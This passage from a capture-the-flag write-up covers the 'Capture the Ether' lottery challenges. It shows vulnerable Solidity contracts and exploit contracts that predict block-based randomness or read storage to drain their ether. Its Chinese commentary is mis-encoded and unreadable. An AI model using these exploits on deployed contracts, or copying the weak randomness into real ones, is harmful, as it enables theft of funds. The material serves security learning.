class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">guess</span><span class=\"params\">(uint8 n)</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (keccak256(n) == answerHash) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>é¢˜å¤–è¯ è¿™é‡Œæ˜¯ä½ç‰ˆæœ¬çš„æ„é€ å‡½æ•° éœ€è¦åˆ›å»ºçš„æ—¶å€™å°±æ‰“ä¸€ä¸ª ether</p>\n<p>8 ä½çš„ keccak<br>\n çˆ†ç ´å³å¯</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract solution&#123;</span><br><span class=\"line\">    bytes32 answerHash = <span class=\"number\">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class=\"line\">    uint public x;</span><br><span class=\"line\">    function <span class=\"title function_\">answer</span><span class=\"params\">()</span> public <span class=\"title function_\">returns</span><span class=\"params\">(uint8)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(uint8 i = <span class=\"number\">0</span> ; i &lt; <span class=\"number\">2</span>**<span class=\"number\">8</span> ; i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(keccak256(i) == answerHash)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                x = i;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">2</span>**<span class=\"number\">8</span><span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-the-random-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-random-number\">#</a> Guess the random number</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheRandomNumberChallenge &#123;</span><br><span class=\"line\">    uint8 answer;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">GuessTheRandomNumberChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">        answer = uint8(keccak256(block.blockhash(block.number - <span class=\"number\">1</span>), now));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">guess</span><span class=\"params\">(uint8 n)</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (n == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™ä¸ªåˆçº¦æœ‰ç‚¹è€äº†<br>\n In shortÂ  <code>now</code> Â is just an alias forÂ  <code>block.timestamp</code> <br>\n å¦‚æœåœ¨ remix ä¸Šéƒ¨ç½²éœ€è¦æ”¹ä¸€ä¸‹ <code>block.number - 1</code>  ä¸ç„¶ä¼š pending<br>\n <code>block.blockhash()</code> Â is nowÂ  <code>blockhash()</code> Â andÂ  <code>now</code> Â isÂ  <code>block.timestamp</code> . Weâ€™ll see this further on.</p>\n<p>timestamp å’Œ block ä¿¡æ¯éƒ½åœ¨åŒºå—é“¾æ¢ç´¢å™¨ä¸Šå¯è§</p>\n<p><img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/1.png\" alt></p>\n<p><img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/2.png\" alt><br>\ntimestamp <a href=\"https://www.epochconverter.com/\">Epoch Converter - Unix Timestamp Converter</a><br>\n æˆ‘æƒ³ç”¨ <code>interface</code>  ä¸åˆçº¦äº¤äº’ ç»“æœå¤±è´¥äº†ï¼ˆä¸çŸ¥é“åŸå› <br>\n<a href=\"https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347\"> Capture Ether: Guess the Random Number on a Smart Contract | by TomÃ¡s | Better Programming</a></p>\n<p>æ‰€ä»¥è¿˜æ˜¯æ‰‹æ’¸<br>\nç›´æ¥è¯»å– Storage ä¸é¦™å— (ä¹Ÿå¯ä»¥å†™ä¸ª solidity çš„ exp ç”¨ interface æ¥äº¤äº’)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ethers = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;ethers&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs-extra&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">&#x27;dotenv&#x27;</span>).<span class=\"title function_\">config</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"title class_\">Web3</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;web3&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> web3 =  <span class=\"keyword\">new</span> <span class=\"title class_\">Web3</span>(<span class=\"string\">&quot;your_rpc_url&quot;</span>)</span><br><span class=\"line\">contractAddr = <span class=\"string\">&quot;your_contract_addr&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">cl</span> = x =&gt; <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(x)</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getSlot</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddr, idx)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">utils</span>.<span class=\"title function_\">sha3</span>(<span class=\"title function_\">padding</span>(idx))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>()</span><br><span class=\"line\">\t.<span class=\"title function_\">then</span>(<span class=\"function\">() =&gt;</span> process.<span class=\"title function_\">exit</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t.<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(err),</span><br><span class=\"line\">\t\tprocess.<span class=\"title function_\">exit</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-the-new-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-new-number\">#</a> Guess the new number</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheNewNumberChallenge &#123;</span><br><span class=\"line\">    function <span class=\"title function_\">GuessTheNewNumberChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">guess</span><span class=\"params\">(uint8 n)</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">        uint8 answer = uint8(keccak256(block.blockhash(block.number - <span class=\"number\">1</span>), now));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (n == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æ²¡æ³•åœ¨å†…å­˜çœ‹äº† åªèƒ½å—¯è®¡ç®—<br>\nå…³äº now å…³é”®å­—<a href=\"https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties\"> documentation</a><br>\n å°±æ˜¯ timestamp</p>\n<p>æ ¹æ® upon å¤§ä½¬æé†’ blockhash åªåœ¨ 256 ä¸ªå—ä¹‹å†…ç”Ÿæ•ˆ æ‰€ä»¥ä¸¤ä¸ªå—çš„å¸ƒç½®ä¸èƒ½é—´éš”å¤ªä¹…<br>\nå¦åˆ™ blockhash å°±ä¼šè¿”å› 0<br>\n è€Œä¸” blockhash æ˜¯è®¡ç®—å— hash å¦‚æœæœ¬åœ°çš„é“¾æ²¡é‚£ä¹ˆé•¿æ˜¯æ²¡æ³•è®¡ç®—çš„</p>\n<p>å¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨ç”Ÿæˆç¬¬äºŒä¸ªåŒºå—é’±åŒæ—¶æ‰§è¡Œ exp åˆçº¦å’Œç›®æ ‡åˆçº¦ é‚£ä¹ˆç»“æœä¹Ÿæ˜¯ä¸€æ ·çš„<br>\nå› ä¸º answer æ˜¯è°ƒç”¨æ—¶æ‰ç”Ÿæˆ<br>\nç›´æ¥å†™ä¸ª sol äº¤äº’</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.8</span><span class=\"number\">.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Challenge &#123;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">guess</span><span class=\"params\">(uint8 n)</span> external payable;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract <span class=\"built_in\">exp</span>&#123;</span><br><span class=\"line\">\tChallenge public cha;</span><br><span class=\"line\">\tconstructor(address addr)&#123;</span><br><span class=\"line\">\t\tcha = Challenge(addr);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">solve</span><span class=\"params\">()</span> public payable&#123;</span><br><span class=\"line\">\t\tuint8 ans = uint8(uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">\t\t\tblockhash(block.number - <span class=\"number\">1</span>), block.timestamp</span><br><span class=\"line\">\t\t))));</span><br><span class=\"line\">\t\tcha.guess&#123;value: <span class=\"number\">1</span> ether&#125;(ans);</span><br><span class=\"line\">\t\tpayable(msg.sender).transfer(address(this).balance);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treceive() external payable&#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æ³¨æ„ ä¸€å®šè¦å°†æ­¤åˆçº¦çš„é’±è½¬å‡º<br>\n <code>payable(msg.sender).transfer(address(this).balance);</code> <br>\n å¦å¤–ä¸€å®šè¦æœ‰ <code>receive</code>  å‡½æ•° ï¼ˆæ²¡ function ï¼‰ æ¥ç¡®ä¿æœ‰é’±è½¬å…¥</p>\n<h2 id=\"predict-the-future\"><a class=\"markdownIt-Anchor\" href=\"#predict-the-future\">#</a> Predict the future</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PredictTheFutureChallenge &#123;</span><br><span class=\"line\">    address guesser;</span><br><span class=\"line\">    uint8 guess;</span><br><span class=\"line\">    uint256 settlementBlockNumber;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">PredictTheFutureChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">lockInGuess</span><span class=\"params\">(uint8 n)</span> public payable &#123;</span><br><span class=\"line\">        require(guesser == <span class=\"number\">0</span>);</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = msg.sender;</span><br><span class=\"line\">        guess = n;</span><br><span class=\"line\">        settlementBlockNumber = block.number + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">settle</span><span class=\"params\">()</span> public &#123;</span><br><span class=\"line\">        require(msg.sender == guesser);</span><br><span class=\"line\">        require(block.number &gt; settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        uint8 answer = uint8(keccak256(block.blockhash(block.number - <span class=\"number\">1</span>), now)) % <span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (guess == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å…ˆè¦ç”¨ <code>lockInGuess</code>  è®¾ç½® guess å€¼<br>\nç„¶åç­‰å¾… block å¢åŠ äº† ç”¨ä¹‹å‰å†™å…¥çš„å»é¢„æµ‹åˆ°å¢åŠ åçš„å—æ•°</p>\n<p>ä½†æ˜¯ä¹‹åçš„å—æ•°å’Œæ—¶é—´éƒ½æ˜¯å¯ä»¥é¢„æµ‹çš„ å¹¶ä¸”åªæœ‰åç§å¯èƒ½æ€§<br>\nä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ç­‰åˆ° answer æ»¡è¶³æˆ‘ä»¬çš„ guess çš„æ—¶å€™å†è°ƒç”¨ <code>settle</code></p>\n<p>æ³¨æ„ å¦‚æœå‡ºç° <code># Transaction mined but execution failed</code> <br>\n ä¸€å®šè¦æ”¹ matemask çš„ gas limit<br>\n ä¸ç„¶æŸ¥ txn ä¼šæŸ¥å‡º gas è¶…äº†<br>\n<img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/3.png\" alt><br>\nè¿™ä¸ªæ˜¯å€ŸåŠ©ä¸­ä»‹åˆçº¦ä¸€ä¸ªä¸ªè¯• å¦‚æœæˆåŠŸäº†å°±æ‰è°ƒç”¨ solve</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\">import <span class=\"string\">&quot;./challenge.sol&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">contract <span class=\"built_in\">exp</span>&#123;</span><br><span class=\"line\">\taddress owner;</span><br><span class=\"line\">\tPredictTheFutureChallenge public cha;</span><br><span class=\"line\">\tuint8 public n;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> public success;</span><br><span class=\"line\">\tuint8 public answer;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">exp</span><span class=\"params\">(address addr)</span> public &#123;</span><br><span class=\"line\">\t\towner = msg.sender;</span><br><span class=\"line\">\t\tcha = PredictTheFutureChallenge(addr);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">lockNumber</span><span class=\"params\">(uint8 _n)</span> public payable&#123;</span><br><span class=\"line\">\t\trequire(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">\t\trequire(_n &lt;= <span class=\"number\">9</span> &amp;&amp; _n &gt;= <span class=\"number\">0</span>);</span><br><span class=\"line\">\t\tn = _n;</span><br><span class=\"line\">\t\tcha.lockInGuess.value(msg.value)(_n);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">transfer</span><span class=\"params\">()</span> external payable &#123;</span><br><span class=\"line\">\t\taddress(this).transfer(msg.value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">solve</span><span class=\"params\">()</span> public payable&#123;</span><br><span class=\"line\">\t\tanswer = uint8(uint256(keccak256(</span><br><span class=\"line\">\t\t\tabi.encodePacked(</span><br><span class=\"line\">\t\t\t\tblock.blockhash(block.number - <span class=\"number\">1</span>), now</span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\t))) % <span class=\"number\">10</span> ;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(answer == n)&#123;</span><br><span class=\"line\">\t\t\tsuccess = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\tcha.settle();</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// require(cha.isComplete(), &quot;Wrong answer&quot;);</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">withdraw</span><span class=\"params\">()</span> external payable&#123;</span><br><span class=\"line\">\t\trequire(msg.sender == owner);</span><br><span class=\"line\">\t\towner.transfer(address(this).balance);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction() public payable &#123;&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// receive external payable&#123;&#125;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"predict-the-block-hash\"><a class=\"markdownIt-Anchor\" href=\"#predict-the-block-hash\">#</a> Predict the block hash</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PredictTheBlockHashChallenge &#123;</span><br><span class=\"line\">    address guesser;</span><br><span class=\"line\">    bytes32 guess;</span><br><span class=\"line\">    uint256 settlementBlockNumber;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">PredictTheBlockHashChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">lockInGuess</span><span class=\"params\">(bytes32 hash)</span> public payable &#123;</span><br><span class=\"line\">        require(guesser == <span class=\"number\">0</span>);</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = msg.sender;</span><br><span class=\"line\">        guess = hash;</span><br><span class=\"line\">        settlementBlockNumber = block.number + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">settle</span><span class=\"params\">()</span> public &#123;</span><br><span class=\"line\">        require(msg.sender == guesser);</span><br><span class=\"line\">        require(block.number &gt; settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (guess == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span 